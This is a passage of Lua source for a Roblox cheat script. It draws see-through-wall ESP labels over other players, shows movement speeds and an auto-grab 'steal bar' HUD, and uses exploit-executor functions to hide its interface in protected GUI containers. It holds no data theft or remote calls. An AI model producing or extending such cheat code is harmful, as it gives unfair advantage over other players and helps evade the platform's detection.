    if not data then return end
    local char = plr.Character
    if not char then M.removePlayerSpeedGui(plr); return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local speed = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z).Magnitude
    data.label.Text = string.format("%.1f", speed)
end

function M.updateAllPlayerSpeeds()
    for plr, _ in pairs(M.playerSpeedGuis) do M.updatePlayerSpeed(plr) end
end

function M.startPlayerSpeedUpdates()
    if M.playerSpeedUpdateConn then return end
    M.playerSpeedUpdateConn = RunService.Heartbeat:Connect(function() M.updateAllPlayerSpeeds() end)
end

function M.stopPlayerSpeedUpdates()
    if M.playerSpeedUpdateConn then M.playerSpeedUpdateConn:Disconnect(); M.playerSpeedUpdateConn = nil end
end

function M.togglePlayerSpeeds(on)
    M.showPlayerSpeeds = on
    if on then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player then M.createPlayerSpeedGui(plr) end
        end
        M.startPlayerSpeedUpdates()
    else
        for plr, _ in pairs(M.playerSpeedGuis) do M.removePlayerSpeedGui(plr) end
        M.stopPlayerSpeedUpdates()
    end
end

-- ============================================================
-- PLAYER ESP
-- ============================================================
function M.addESP(plr)
    if plr == player then return end
    if M.espList[plr] then M.removeESP(plr) end
    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    local accent = (UI_ACCENT or (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255))

    -- Circular avatar logo above enemy head
    local avatarBB = Instance.new("BillboardGui")
    avatarBB.Name = "VynxEnemyAvatar"
    avatarBB.Size = UDim2.new(0, 42, 0, 42)
    avatarBB.StudsOffset = Vector3.new(0, 2.6, 0)
    avatarBB.AlwaysOnTop = true
    avatarBB.MaxDistance = 600
    avatarBB.Adornee = head
    avatarBB.Parent = head

    local ring = Instance.new("Frame")
    ring.Name = "AvatarRing"
    ring.Size = UDim2.new(1, 0, 1, 0)
    ring.BackgroundColor3 = accent
    ring.BorderSizePixel = 0
    ring.Parent = avatarBB
    Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)
    do
        local st = Instance.new("UIStroke")
        st.Color = Color3.fromRGB(255, 255, 255)
        st.Thickness = 2.2
        st.Transparency = 0.1
        st.Parent = ring
    end

    local img = Instance.new("ImageLabel")
    img.Name = "AvatarImg"
    img.Size = UDim2.new(1, -10, 1, -10)
    img.Position = UDim2.new(0, 5, 0, 5)
    img.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
    img.BackgroundTransparency = 0
    img.ScaleType = Enum.ScaleType.Crop
    img.Parent = ring
    Instance.new("UICorner", img).CornerRadius = UDim.new(1, 0)
    pcall(function()
        local ok, content = pcall(function()
            return Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
        end)
        if ok and content then
            img.Image = content
        else
            img.Image = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", plr.UserId)
        end
    end)

    local nameBB = Instance.new("BillboardGui")
    nameBB.Size = UDim2.new(0, 110, 0, 18)
    nameBB.StudsOffset = Vector3.new(0, 4.0, 0)
    nameBB.AlwaysOnTop = true
    nameBB.Adornee = head
    nameBB.Parent = head
    local nameLbl = Instance.new("TextLabel", nameBB)
    nameLbl.Size = UDim2.new(1,0,1,0)
    nameLbl.BackgroundTransparency = 1
    nameLbl.Text = plr.DisplayName or plr.Name
    nameLbl.TextColor3 = Color3.fromRGB(255,255,255)
    nameLbl.Font = Enum.Font.GothamBold
    nameLbl.TextScaled = true
    nameLbl.TextStrokeTransparency = 0
    nameLbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)

    -- Highlight mode removed
    M.espList[plr] = {nameBB = nameBB, avatarBB = avatarBB, highlight = nil}
end

function M.removeESP(plr)
    local data = M.espList[plr]
    if data then
        if data.nameBB then pcall(function() data.nameBB:Destroy() end) end
        if data.avatarBB then pcall(function() data.avatarBB:Destroy() end) end
        if data.highlight then pcall(function() data.highlight:Destroy() end) end
        M.espList[plr] = nil
    end
end

function M.clearESP()
    for plr, _ in pairs(M.espList) do M.removeESP(plr) end
end

function M.toggleESP(on)
    M.playerESPEnabled = on
    if on then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player then
                M.addESP(plr)
                if not plr:GetAttribute("VynxEspCharHook") then
                    plr:SetAttribute("VynxEspCharHook", true)
                    plr.CharacterAdded:Connect(function(char)
                        if M.playerESPEnabled then
                            task.wait(0.35)
                            pcall(function() M.addESP(plr) end)
                            task.delay(1.0, function()
                                if M.playerESPEnabled and plr.Character == char then
                                    pcall(function() M.addESP(plr) end)
                                end
                            end)
                        end
                    end)
                end
            end
        end
        if not M._espPlayerAdded then
            M._espPlayerAdded = Players.PlayerAdded:Connect(function(p)
                if p ~= player and M.playerESPEnabled then
                    p.CharacterAdded:Connect(function()
                        task.wait(0.5)
                        if M.playerESPEnabled then M.addESP(p) end
                    end)
                    if p.Character then task.defer(function() task.wait(0.5); if M.playerESPEnabled then M.addESP(p) end end) end
                end
            end)
            M.trackConn(M._espPlayerAdded)
        end
        if not M._espPlayerRemoved then
            M._espPlayerRemoved = Players.PlayerRemoving:Connect(function(p)
                M.removeESP(p)
            end)
            M.trackConn(M._espPlayerRemoved)
        end
    else
        M.clearESP()
        if M._espPlayerAdded then M._espPlayerAdded:Disconnect(); M._espPlayerAdded = nil end
        if M._espPlayerRemoved then M._espPlayerRemoved:Disconnect(); M._espPlayerRemoved = nil end
    end
end

-- ============================================================
-- OVER-HEAD INDICATOR
-- ============================================================
M.headIndicator = nil

function M.setupHeadIndicator(char)
    if not char then return end
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 8)
    if not head then return end
    local old = head:FindFirstChild("MoveeHeadIndicator")
    if old then old:Destroy() end

    local bb = Instance.new("BillboardGui")
    bb.Name = "MoveeHeadIndicator"
    bb.Size = UDim2.new(0, 420, 0, 110)
    bb.StudsOffset = Vector3.new(0, 3.5, 0)
    bb.AlwaysOnTop = true
    bb.MaxDistance = 250
    bb.LightInfluence = 0
    bb.ResetOnSpawn = false
    bb.Adornee = head
    bb.Parent = head

    -- Discord tag: same visual weight as speed label (size + spacing)
    local discordLbl = Instance.new("TextLabel")
    discordLbl.Name = "DiscordTag"
    discordLbl.Size = UDim2.new(1, 0, 0, 36)
    discordLbl.Position = UDim2.new(0, 0, 0, 0)
    discordLbl.BackgroundTransparency = 1
    discordLbl.Text = "xim duels"
    discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    discordLbl.Font = Enum.Font.GothamBlack
    discordLbl.TextSize = 28
    discordLbl.TextScaled = false
    discordLbl.TextStrokeTransparency = 0
    discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    discordLbl.TextXAlignment = Enum.TextXAlignment.Center
    discordLbl.Parent = bb

    -- Speed level: same style, tight spacing under discord
    local speedLbl = Instance.new("TextLabel")
    speedLbl.Name = "Speed"
    speedLbl.Size = UDim2.new(1, 0, 0, 48)
    speedLbl.Position = UDim2.new(0, 0, 0, 38)
    speedLbl.BackgroundTransparency = 1
    speedLbl.Text = "0 speed"
    speedLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    speedLbl.Font = Enum.Font.GothamBlack
    speedLbl.TextSize = 36
    speedLbl.TextScaled = false
    speedLbl.TextStrokeTransparency = 0
    speedLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    speedLbl.TextXAlignment = Enum.TextXAlignment.Center
    speedLbl.Parent = bb

    local ragdollLbl = Instance.new("TextLabel")
    ragdollLbl.Name = "RagdollTimer"
    ragdollLbl.Size = UDim2.new(1, 0, 0, 16)
    ragdollLbl.Position = UDim2.new(0, 0, 0, 88)
    ragdollLbl.BackgroundTransparency = 1
    ragdollLbl.Text = ""
    ragdollLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    ragdollLbl.Font = Enum.Font.GothamBold
    ragdollLbl.TextSize = 13
    ragdollLbl.TextStrokeTransparency = 0
    ragdollLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    ragdollLbl.Parent = bb

    M.headIndicator = {bb = bb, discord = discordLbl, speed = speedLbl, ragdollTimer = ragdollLbl, divider = nil}
    pcall(M.updateHeadTheme)
end

function M.updateHeadTheme()
    if not M.headIndicator then return end
    if M.headIndicator.discord then
        M.headIndicator.discord.TextColor3 = Color3.fromRGB(255, 255, 255)
        M.headIndicator.discord.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        local g = M.headIndicator.discord:FindFirstChild("HalfBlackRed")
        if g then pcall(function() g:Destroy() end) end
    end
    if M.headIndicator.speed then
        M.headIndicator.speed.TextColor3 = Color3.fromRGB(255, 255, 255)
        M.headIndicator.speed.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    end
    if M.headIndicator.ragdollTimer then
        M.headIndicator.ragdollTimer.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
    if M.headIndicator.divider and M.headIndicator.divider.Parent then
        M.headIndicator.divider.Visible = false
    end
end

local speedUpdateConn = nil
function M.startHeadSpeedUpdates()
    if speedUpdateConn then return end
    local _headAcc = 0
    speedUpdateConn = RunService.Heartbeat:Connect(function(dt)
        _headAcc = _headAcc + (dt or 0.016)
        if _headAcc < 0.12 then return end
        _headAcc = 0
        local char = player.Character
        if char and M.headIndicator and M.headIndicator.speed then
            local displaySpeed
            if M.autoLeftEnabled or M.autoRightEnabled then
                displaySpeed = M.NS
            else
                displaySpeed = M.getActiveMoveSpeed()
            end
            if type(displaySpeed) ~= "number" then displaySpeed = 0 end
            -- screenshot style: "0 speed" / "58 speed"
            M.headIndicator.speed.Text = string.format("%d speed", math.floor(displaySpeed + 0.5))
            if M.headIndicator.discord and M.headIndicator.discord.Text == "" then
                M.headIndicator.discord.Text = "xim duels"
            end
        end
    end)
end

function M.stopHeadSpeedUpdates()
    if speedUpdateConn then
        speedUpdateConn:Disconnect()
        speedUpdateConn = nil
    end
end

-- ============================================================
-- Xim STATUS UI (Steal Bar)
-- ============================================================

-- Steal bar green splash background (from reference HUD)
local function _vynxB64decode(data)
    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    data = data:gsub("[^"..b.."=]", "")
    return (data:gsub(".", function(x)
        if x == "=" then return "" end
        local r, f = "", (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i - 1) > 0 and "1" or "0") end
        return r
    end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
        if #x ~= 8 then return "" end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == "1" and 2^(8 - i) or 0) end
        return string.char(c)
    end))
end

local VYNX_STEAL_SPLASH_B64 = "iVBORw0KGgoAAAANSUhEUgAAAgAAAABMCAMAAAAso//2AAAAkFBMVEUezjcb0jUcmC9U+2FH9Vgu1ENT+2APUhksz0Iv5kYdnS8Yry0QaBwHMg06s0Mo0D8WzS1BvkohtzgAAwAitzkx6EgDFgYiuDk58FAGJgs48E9m/3IKORFm/3IXeyY48E8OURkTZyA58VBm/3IgqzUv5UYblS9Z/mYv5UYv10QmxD1Y/mUdojIw5kdl/3EiujmKkBZiAAAAMHRSTlNfnB4kYliKHCiPYZNUKWkuwW4PACptB1BQCi8uDhIcERQYak8jTyFxLy4xTyISbmgKcCVHAAAK9klEQVR42u2dC1caORiGMwLCDFB3VxGxWFYKi4Na/v+/2yQzk3y5fLkBSmvec3qzPWWS55kkk0kiGbMUxV80hTVleS2y6/LapN9mOxjUo9Fof5eSf75yEuprs3mjqWgIUTiVENUvkJ8w8C/ovyMN/wKhz/9fL3+Kv84CfJQAd0AAggmA4dcUkAIUuAAY/+7ur+sGfwr/f3LiJeBNQNUaQNz8f9ojFSBe/qXOX7n9a4E/ln8Gn2zBhmVOQ5qg/H/iEQIURTr/noA/2u/3mf3HtgXAAEIg/wD8UgESyf9V8u+9iHs/0/8UB6QCg4HB/6c/XgFw/q+9HuPf0M8t/6e3AoPBrI/y/65GVcAqQNezSAE0/j0Wfv/vc8//yWPCOeffCWDg/24LUIAg9Nt+xcG/l/Tkl/me/KGg5d/fmfy/40EEIDAI/16vl1uASxKA8h/QMRklFIxfKkBQ/GSmCaDxz2OAy+C/T+TfGkAw/EwAJ/9e4lNAVuCk+PesAdh6+T81MRUgGH4y6wTA+De9QDcRkC34+FlhWuVE5//L5P+kRlWAIPiZAJYGoKenhg7EWpA9SH4fwOAz/JL/DuH/ZAYaQBD8lP/M2wA0odwNC/LM0BnhN+RJNwW0nZkdgAu/qgCx42cCrAMaACCBZkGcBxl+0KyPhZPK/1cYf2AAwTLrppaCBGgtqOta16DxINSErw5+IwPm+qzk1QYgkr80IFCA1xABwKDA9EBtEbRSfgkTQqi/gWzu3Oy7BmBN+V9bBXh68hsQJUAvPHWNmLBvS9wWUskf6IIXOaD+nxL2xt+Hn5Bt0wBcW0cAJxFglyaA6sEAhpVfKal0Xs9va4KLt3Kjw4q4gvlPrPjwCLA2BAji3xlwZgFY2lVjIvPNRimpFqUVtOYChUBRGw27XtyuGoY/2jw/Pw9proIE2H6sAK/J/Pty+eBgXtHiDmlBf8igOmhGOLRQDTkPZO8nG9dqKY8oKyj/Mw/l/i8P/c2E8UdnaXUBfp1egMGJBOj3dQO+VVddSemvz11+KHEZYdcixpDUuD4Uu1Abb4EcUme1IcMEGBeFR4GzCtAYsDvSAHX9MDOgqpSSdsVXdTCMCNMi0JCEBHwiglrlrSCX0Jcii8Vy2Qigrtb8cAEGAzYV2EADS4FeU/i/thqx/+sbF4AVdLEEMXQwjcC0SDQkNi6+CGqDtxU5r4su9/f0p+lwMtH4uwXYnUUAtsoASRp/LtS3akJLz0p6v1CyVGMzAtUi2JCj4/po5GoN3ipyTl1JggC7k88DkHbM3ncmSoBrIcBUL/K9oYNphFuLcEOS4/9YG2oLbxP5/a0ME4DzD+oBOgF4YiYCLALwmQc59Sie22b9fqIGBv/r/t+sB1guYInbYvuNQLWINCQpLr4u1FbeKnK9JqbTkAZg22TdBwbwrloaEDEVXFWHuRJoAJNAZE3zAIN78GoRoG0Abr25R7LwZXnOeD8du+zb4FABzB7AQr4J5WEYwEZqHgXUl0GUvoaf5YA6AEIvQdOg7+QfLkCcFjGGHJOAz789Ml0PYGsAZK2rAvSlBHKw7lAAvA5m8G34IyTgl6RK0JdPDZB/0wAMF0dX0lGGHJfbcwftASw3X9MiK/2xsnbbvyKEHFz8LRLMHGF9g6HAzhBgujh/Lf6+sfYABcHrXDdA1n2nwHfHmjDiwy8cEBbMZm4J1spl7GwNQBbA0wNMVP6ls77XDgmMZkBfFUoM2HAdgjTgAByQvRB2TX21W+r45wYgaQhQliXe7T48rJUYDohmwL4unJjs1Z1nNgW2ahzNgMr/+lvFBMgNQMwQoLTw157DulgscCjQbgxB6esOOAywSQAV6PiXtAGYDHMDECEA3/dfqvfWgzuaBK0C6NYwJ37FgUOrgN0AwwFpgDi3oKxyDxAggBwDlir/tZ++IoHaE9h3hxIf/ggDdAeaK5DnFpVFFiBYAOP2D6cPHFAGhNYN4sTPXyoADKC0X1g8CgD812U5zkOAGAEgfyv+R5gQBSxHRBANP7KuzRwHvIDgCsgTJmhRivF4wgTIkIMEAPxN/I/24D2BxYDmiBjXqkvUACpA/fKCOaAIUEr+WYB4AWz4H93BWgHNgO6QKPeiW9wATQDFAUUAqgD/mfGnAkyzAGECdPzXKv/HkNgbgZ00ABwT51l0jRpQmwZYFChFCiZAlQUIFODQPv+n4FcVAE+FcuGIRQDviucAAYAChgFZgKhXAQdi4f8YkzADrol3jb29CWgFeA81oGh7gEl+CvTOBLMFoQc+4+7hv4KJN4DP0BD/Hgt7E1BTA9553AYI/p0A+SkwTgAE/8oWRAHNAOqAnKEnAXtsVAOkAO9d7ApAA4oP6wF+9/UArQDEzX+FJdAA+Y4mXgBqwFwTQFPALsD4JAL86SuC7u+XbE+AaACs/FeuhBrQzhCRkE12fgEUBSxNQMIQ4GuuCWQNwFD2ADb+K188BojwryQJcLAIgBsAnwHwieC8KriphQXfFORoAFarGAP0N8WQPqdzshbg3dkJMAGqpgcQRc/7AgwdaCUsWQMwxxuA1eo4A9qIqbojBBi9vwd3Ai3/4VQpet4ZpOvA+AsB5JLrSP7QAJsAcqaWgkwfBOoCvKNNwKAsyIELMFxiyE+8N/CcOePeQF4NrAcYwMXftEKTBXjUBYDwSYoABy7APkgAbgBbPkC4AGqxj9kdfNlJ3h1M/4IdDTHnAmyhAG1CBUCbAI1+J0D8RFCIAGA/ARegMraEB5wPYIl+msqlxHNd3vMBmhq5agQY2Pi/NHNvxwtAdAGipoJZD3DjEkA/FYjyJ/OKnwsxBNSRbd36Du+3t7dIEmc7CSbyOsCxAjZJLDow/q0ATTT+L7K2jxGAmALEvAxChgDvnHxtngvFPmY+r2jRKXuDecAZQR/F9+SGRJwRxOtkyKpjczeHu7Ga6rQY4LQgXoC418FmDyBPiZQGgI+ZzzdvQH7/KWFXzWE/f8T5gKI87lPCmrBSi004Wp3WhgGIBOggUBOgKBIWhJg9wEicFNvmZt+dZSwEYN/tzoR+8cd/fcRhYlIGXiPiKGh5uKJ26KLfgbAGgO85i1sS1o4A9uAy1Gts0WvpSm1Q/4pnxXqOjQSHgXfRPeB/cCnwGCJAu+kwalEoeBXYXAG8tBsUvVbSfFp0+FnRmAcjQ4Jw/jPAv4haFt7xv9HOAbaxz9804KQHhhseCAKmAejLIMBfbjuO2Bgi9gUo/G/SyefvGBF7arxqgdYZeF8Ginl5uO88fGsY5F9rh8HHo8/gkz1QJQAKeJYDwNU5hgD+zaFyX5AQ4CYNfoZ9OguaIUGrgHtBkJV/Ebw9XO4KEs8j+c6/iB6hGRU2rwpci0Kt/AvzhBDrARHi9idyciJ3+RegwF1nwItuwIN+/5c2/kXAGUEQP+BfJ/DPApxcANUAdGMIXJ9vEcDtwAHy5xsCxGP/XRbgswW4swjwgDT/Jn8pAOLAAdAng5Z/Y0BuAS6zBTC3B8sNWhr98XhM6I/xwW5B9yXl9GDxwjdpDJAVOP39r4wBbIfFIPzHPKT97QGLdnh093oaPAVkAz5zBCifAsQKQm0RmLI/U8NfVUT+2UVf4O8WKChvfu5yM/AZN39z948kGeuJYfjtz1ZpTojyNYQ/WJ4i0nxllKpAtuA49h1/hYwF/7rE+HP8igCGARp/7TSgbrVPsgDZgWPoc/4qGRt/x/3P+Q9JgRrg5i/WfB5jQGafLoDBf+vibzYAHP90+j+1eD9IBGZwiwAAAABJRU5ErkJggg=="
local VYNX_STEAL_SPLASH_FILE = "vynx_steal_splash.png"
local function _vynxEnsureStealSplash()
    local ok, asset = pcall(function()
        if not isfile or not writefile or not getcustomasset then return nil end
        if not isfile(VYNX_STEAL_SPLASH_FILE) then
            writefile(VYNX_STEAL_SPLASH_FILE, _vynxB64decode(VYNX_STEAL_SPLASH_B64))
        end
        return getcustomasset(VYNX_STEAL_SPLASH_FILE)
    end)
    if ok and asset and asset ~= "" then return asset end
    return nil
end


-- ============================================================
-- TOP CENTER BANNER: discord + FPS + MS (live)
-- ============================================================
function M.buildTopBanner()
    -- REMOVED: top banner disabled
    if M.topBannerGui then
        pcall(function() M.topBannerGui:Destroy() end)
        M.topBannerGui = nil
    end
    if true then return end
    if M.topBannerGui then
        pcall(function() M.topBannerGui:Destroy() end)
        M.topBannerGui = nil
    end
    if M._topBannerConn then
        pcall(function() M._topBannerConn:Disconnect() end)
        M._topBannerConn = nil
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxTopBanner"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 40
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    local parented = false
    if gethui then parented = pcall(function() gui.Parent = gethui() end) end
    if not parented then parented = pcall(function() gui.Parent = game:GetService("CoreGui") end) end
    if not parented then gui.Parent = player:WaitForChild("PlayerGui") end
    M.topBannerGui = gui

    local accent = (M.getThemeAccent and M.getThemeAccent()) or UI_ACCENT or Color3.fromRGB(255, 255, 255)

    -- fixed center pill; text fully inside with padding
    local BANNER_W, BANNER_H = 300, 32
    local holder = Instance.new("Frame")
    holder.Name = "BannerHolder"
    holder.AnchorPoint = Vector2.new(0.5, 0)
    holder.Size = UDim2.new(0, BANNER_W, 0, BANNER_H)
    holder.Position = UDim2.new(0.5, 0, 0, 6)
    holder.BackgroundTransparency = 1
    holder.Parent = gui
    M.topBannerHolder = holder

    local banner = Instance.new("Frame")
    banner.Name = "Banner"
    banner.Size = UDim2.new(1, 0, 1, 0)
    banner.BackgroundColor3 = Color3.fromRGB(10, 8, 12)
    banner.BackgroundTransparency = 0.08
    banner.BorderSizePixel = 0
    banner.ClipsDescendants = true
    banner.Parent = holder
    Instance.new("UICorner", banner).CornerRadius = UDim.new(1, 0)
    local stroke = Instance.new("UIStroke")
    stroke.Name = "BannerStroke"
    stroke.Color = accent
    stroke.Thickness = 1.5
    stroke.Transparency = 0.2
    stroke.Parent = banner

    -- ONE label inside, left-padded, clipped
    local line = Instance.new("TextLabel")
    line.Name = "BannerLine"
    line.BackgroundTransparency = 1
    line.Size = UDim2.new(1, -20, 1, 0)
    line.Position = UDim2.new(0, 12, 0, 0)
    line.Font = Enum.Font.GothamBold
    line.TextSize = 12
    line.TextXAlignment = Enum.TextXAlignment.Left
    line.TextYAlignment = Enum.TextYAlignment.Center
    line.TextColor3 = Color3.fromRGB(255, 255, 255)
    line.TextStrokeTransparency = 0.6
    line.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    line.Text = "xim duels   FPS: --   MS: --"
    line.TextTruncate = Enum.TextTruncate.AtEnd
    line.ClipsDescendants = true
    line.Parent = banner

    M.topBannerLine = line
    M.topBannerStroke = stroke

    local frames, last = 0, tick()
    M._topBannerConn = RunService.RenderStepped:Connect(function()
        if not gui or not gui.Parent then return end
        frames = frames + 1
        local now = tick()
        if now - last >= 0.5 then
            local fps = math.floor(frames / (now - last) + 0.5)
            frames = 0
            last = now
            local pingMs = 0
            pcall(function()
                pingMs = math.floor((player:GetNetworkPing() or 0) * 1000 + 0.5)
            end)
            if line and line.Parent then
                line.Text = string.format("xim duels   FPS: %d   MS: %d", fps, pingMs)
            end
        end
    end)

    M.refreshTopBannerTheme = function()
        local a = (M.getThemeAccent and M.getThemeAccent()) or UI_ACCENT or Color3.fromRGB(255, 255, 255)
        if stroke then stroke.Color = a end
        if line then line.TextColor3 = Color3.fromRGB(255, 255, 255) end
    end
end

function M.buildStatusUI()
    if M.statusGui then
        pcall(function() M.statusGui:Destroy() end)
        M.statusGui = nil
    end
    if M._stealBarStatsConn then
        pcall(function() M._stealBarStatsConn:Disconnect() end)
        M._stealBarStatsConn = nil
    end
    if M._statusDotPulseConn then
        pcall(function() M._statusDotPulseConn:Disconnect() end)
        M._statusDotPulseConn = nil
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxStatusUI"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 50
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    local parented = false
    if gethui then parented = pcall(function() gui.Parent = gethui() end) end
    if not parented then parented = pcall(function() gui.Parent = game:GetService("CoreGui") end) end
    if not parented then gui.Parent = player:WaitForChild("PlayerGui") end

    local barW = math.max(tonumber(M.stealBarSize) or 320, 300)
    local barH = 32

    local holder = Instance.new("Frame")
    holder.Name = "StealBarHolder"
    holder.Size = UDim2.new(0, barW, 0, barH)
    holder.Position = UDim2.new(0.5, -math.floor(barW / 2), 1, -60)
    holder.BackgroundTransparency = 1
    holder.BorderSizePixel = 0
    holder.Active = true
    holder.Parent = gui
    M.statusHolder = holder

    local frame = Instance.new("Frame")
    frame.Name = "StealBar"
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
    frame.BackgroundTransparency = 0.05
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.ZIndex = 2
    frame.Parent = holder
    Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)
    M.statusMain = frame
    M.statusBgImg = nil

    -- Dots background
    do
        local dots = Instance.new("Frame")
        dots.Name = "DotPattern"
        dots.BackgroundTransparency = 1
        dots.Size = UDim2.fromScale(1, 1)
        dots.ZIndex = 2
        dots.ClipsDescendants = true
        dots.Parent = frame
        Instance.new("UICorner", dots).CornerRadius = UDim.new(1, 0)
        local rng = Random.new(77)
        for i = 1, 90 do
            local d = Instance.new("Frame")
            d.Name = "Dot"
            local sz = rng:NextNumber(0.7, 2.0)
            d.Size = UDim2.new(0, sz, 0, sz)
            d.Position = UDim2.new(rng:NextNumber(0.02, 0.98), 0, rng:NextNumber(0.08, 0.92), 0)
            d.AnchorPoint = Vector2.new(0.5, 0.5)
            d.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            d.BackgroundTransparency = rng:NextNumber(0.55, 0.88)
            d.BorderSizePixel = 0
            d.ZIndex = 2
            d.Parent = dots
            Instance.new("UICorner", d).CornerRadius = UDim.new(1, 0)
        end
    end

    -- Progress track (left)
    local track = Instance.new("Frame")
    track.Name = "StealTrack"
    track.Size = UDim2.new(0, 88, 0, 18)
    track.Position = UDim2.new(0, 8, 0.5, -9)
    track.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    track.BackgroundTransparency = 0.45
    track.BorderSizePixel = 0
    track.ClipsDescendants = true
    track.ZIndex = 4
    track.Parent = frame
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local fill = Instance.new("Frame")
    fill.Name = "Fill"
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    fill.BackgroundTransparency = 0.2
    fill.BorderSizePixel = 0
    fill.ZIndex = 5
    fill.Parent = track
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
    M.statusFill = fill

    local stealText = Instance.new("TextLabel")
    stealText.Name = "StealText"
    stealText.Size = UDim2.new(1, 0, 1, 0)
    stealText.BackgroundTransparency = 1
    stealText.Text = "READY"
    stealText.TextColor3 = Color3.fromRGB(255, 255, 255)
    stealText.Font = Enum.Font.GothamBold
    stealText.TextSize = 10
    stealText.ZIndex = 6
    stealText.Parent = track
    M.statusStealLbl = stealText

    -- Percent
    local pctLbl = Instance.new("TextLabel")
    pctLbl.Name = "PctLbl"
    pctLbl.Size = UDim2.new(0, 32, 1, 0)
    pctLbl.Position = UDim2.new(0, 98, 0, 0)
    pctLbl.BackgroundTransparency = 1
    pctLbl.Text = "0%"
    pctLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    pctLbl.Font = Enum.Font.GothamBold
    pctLbl.TextSize = 11
    pctLbl.ZIndex = 5
    pctLbl.Parent = frame
    M.statusBarPctLbl = pctLbl
    M.statusPctLbl = pctLbl

    -- FPS / Discord removed from auto-grab bar (center clean)
    M.statusFpsLbl = nil
    M.statusDiscordLbl = nil

    -- MS (right side)
    local pingLbl = Instance.new("TextLabel")
    pingLbl.Name = "PingLbl"
    pingLbl.Size = UDim2.new(0, 40, 1, 0)
    pingLbl.Position = UDim2.new(1, -70, 0, 0)
    pingLbl.BackgroundTransparency = 1
    pingLbl.Text = "0ms"
    pingLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    pingLbl.Font = Enum.Font.GothamBold
    pingLbl.TextSize = 9
    pingLbl.ZIndex = 5
    pingLbl.Parent = frame
    M.statusPingLbl = pingLbl

    local radLbl = Instance.new("TextLabel")
    radLbl.Name = "RadiusLbl"
    radLbl.Size = UDim2.new(0, 1, 0, 1)
    radLbl.BackgroundTransparency = 1
    radLbl.Text = ""
    radLbl.Visible = false
    radLbl.Parent = frame
    M.statusRadiusLbl = radLbl

    -- White status dot (pulses while stealing)
    local ring = Instance.new("Frame")
    ring.Name = "StatusDot"
    ring.Size = UDim2.new(0, 11, 0, 11)
    ring.Position = UDim2.new(1, -20, 0.5, -5.5)
    ring.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ring.BackgroundTransparency = 0.2
    ring.BorderSizePixel = 0
    ring.ZIndex = 5
    ring.Parent = frame
    Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)
    M.statusDot = ring
    M._statusDotPulsing = false

    M.statusShine = nil
    M.statusKnob = nil
    M._stealShineTween = nil
    M._stealShineActive = false
    M._stealBadgeMaxW = barW
    M.statusModePill = nil
    M.statusModeLbl = nil
    M.statusEqIcon = nil
    M.statusRadiusMarker = nil
    M.statusRadiusMarkerLbl = nil
    M.updateRadiusMarker = function() end
    M.statusGui = gui
    function M.updateStatusModeBadge() end

    -- Restore saved auto-grab UI position
    pcall(function()
        local sp = M.stealBarPos
        if type(sp) == "table" and type(sp.ox) == "number" then
            holder.Position = UDim2.new(
                tonumber(sp.sx) or 0.5, tonumber(sp.ox) or 0,
                tonumber(sp.sy) or 1, tonumber(sp.oy) or -60
            )
        end
    end)

    -- Draggable only when Lock Mobile Buttons is OFF; saves position
    do
        local dragging, dragStart, startPos = false, nil, nil
        local function saveStealBarPos()
            local p = holder.Position
            M.stealBarPos = {
                sx = p.X.Scale, ox = p.X.Offset,
                sy = p.Y.Scale, oy = p.Y.Offset,
            }
            pcall(saveCherryConfig)
        end
        holder.InputBegan:Connect(function(input)
            if M.mobileButtonsLocked or M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = holder.Position
                input.Changed:Connect(function()
